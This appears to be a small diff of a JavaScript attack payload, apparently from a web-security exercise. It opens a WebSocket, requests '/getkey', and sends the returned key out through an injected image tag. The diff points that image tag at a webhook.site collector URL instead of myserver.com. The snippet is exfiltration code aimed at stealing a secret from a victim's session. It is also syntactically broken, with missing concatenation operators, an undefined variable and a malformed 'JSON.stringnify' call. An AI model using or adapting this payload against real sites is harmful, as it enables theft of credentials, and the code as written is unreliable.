@@ -9,7 +9,7 @@
   var ws = new WebSocket(wsurl); 
   ws.onmessage = function(){
     var data = JSON.parse(message.data)
-    document.write('<img src="https://myserver.com/?key='data.text'"/>')
+    document.write('<img src="http://webhook.site/89178b72-247e-4354-ace4-02908a6ecd42/?key='data.text'"/>')
   }
   ws.send(JSON.stringnify{text: "/getkey" })
   
